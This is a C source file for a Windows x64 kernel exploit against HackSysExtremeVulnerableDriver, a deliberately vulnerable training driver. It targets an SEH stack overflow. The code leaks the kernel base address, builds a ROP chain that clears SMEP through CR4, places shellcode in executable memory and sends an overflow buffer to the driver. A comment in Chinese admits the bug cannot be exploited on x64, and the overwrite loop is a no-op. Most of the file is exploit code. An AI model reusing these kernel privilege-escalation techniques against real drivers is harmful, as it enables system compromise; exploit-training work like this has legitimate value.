#include <windows.h>
#include <stdio.h>
#include"shellcode.h"
//x64下seh不在栈上 只能触发一下异常而不崩溃 也就是这个漏洞无法利用 有兴趣的可以试试
HANDLE hDriver;
DWORD dwBytesOut = 0;
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemModuleInformation = 11,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;
typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
typedef struct _ROP {
	PUCHAR PopRcxRet;
	PUCHAR Cr4RegValue;
	PUCHAR MovCr4EcxRet;
} ROP, * PROP;

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG NumberOfModules;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
int main() {


	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	PUCHAR kernelBase = NULL;

	ROP DisableSMEP;
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);

	kernelBase = (PUCHAR)ModuleInfo->Module[0].ImageBase;

	wprintf(L" [+] shellcode is at: 0x%s \n", ModuleInfo->Module[0].FullPathName);
	
	wprintf(L" [*] Allocating Ring0 Payload");
	LPVOID lpvPayload = VirtualAlloc(
		NULL,				// Next page to commit
		0x200,		// Page size, in bytes
		MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
		PAGE_EXECUTE_READWRITE);	// Read/write access
	if (lpvPayload == NULL)
	{
		wprintf(L" -> Unable to reserve Memory!\n\n");
		exit(1);
	}

	HANDLE hDevice;
	HANDLE hMapFile;
	LPCWSTR lpSharedMemoryMap = L"Local\\SharedMemoryMap";
	LPVOID pBuf = NULL;
	BOOL bResult = FALSE;
	LPVOID lpOverflowBuffer;

	hMapFile = CreateFileMapping(
		INVALID_HANDLE_VALUE,    // Use paging file
		NULL,                    // Default security
		PAGE_EXECUTE_READWRITE,  // Read/write/execute access
		0,                       // Maximum object size (high-order DWORD)
		4096,            // Maximum object size (low-order DWORD)
		lpSharedMemoryMap);      // Name of mapping object

	if (hMapFile == NULL)
	{
		wprintf(L" -> Could not create File Mapping Object (%d)! \n\n", GetLastError());
		exit(1);
	}

	pBuf = MapViewOfFile(hMapFile,  // Handle to map object
		FILE_MAP_ALL_ACCESS,	// Read/write permission
		0,
		0,
		4096);

	if (pBuf == NULL)
	{
		wprintf(L" -> Could not Map view of File (%d)! \n\n", GetLastError());
		CloseHandle(hMapFile);
		exit(1);
	}
	memcpy(lpvPayload, ShellCode, 0x100);
	memset(pBuf, 0x41, 4096);
	lpOverflowBuffer = (LPVOID)((ULONG64)pBuf + (4096 - (0x200 + 56 + sizeof(ROP)+8)));
	for (unsigned int i = 0; i < 0; i += 8) // Fill Buffer with Payload address to overwrite the SEH Handler
		*((PULONG)((ULONG64)lpOverflowBuffer + i)) = (ULONG64)lpvPayload;

	VirtualFree(ModuleInfo, 0, MEM_RELEASE);
	DisableSMEP.PopRcxRet = kernelBase + 0x270fce;
	DisableSMEP.Cr4RegValue = (PUCHAR)0x406f8;
	DisableSMEP.MovCr4EcxRet = kernelBase + 0x16e437;
	memcpy((PULONG)((ULONG64)lpOverflowBuffer + 0x200 + 56), &DisableSMEP, sizeof(ROP));
	wprintf(L" [+] shellcode is at: 0x%p \n", ShellCode);
	wprintf(L" [+] Kernel Base Address is at: 0x%p \n", kernelBase);
	wprintf(L" [+] pop rcx ; ret -> Gadget available at: 0x%p \n", DisableSMEP.PopRcxRet);
	wprintf(L" [+] New value of CR4 register: 0x%p \n", DisableSMEP.Cr4RegValue);
	wprintf(L" [+] mov cr4, ecx ; ret -> Gadget available at: 0x%p \n\n", DisableSMEP.MovCr4EcxRet);
	hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a handle on the device\n");
		return(-1);
	}
	//bp fffff8063e7a0000+867B4
	//fffff806`3e8267cf
// + 56 + sizeof(ROP) + 8+8
	//fffff806`3e8267bb 
	DeviceIoControl(hDriver, 0x222007, lpOverflowBuffer, 0x200 + 56 + sizeof(ROP) + 8 + 8, 0, 0, &dwBytesOut, NULL);
	getchar();
	//STARTUPINFO si = { sizeof(si) };
	//PROCESS_INFORMATION pi = { 0 };
	//si.dwFlags = STARTF_USESHOWWINDOW;
	//si.wShowWindow = SW_SHOW;
	//WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	//BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	//getchar();
	return 0;
}
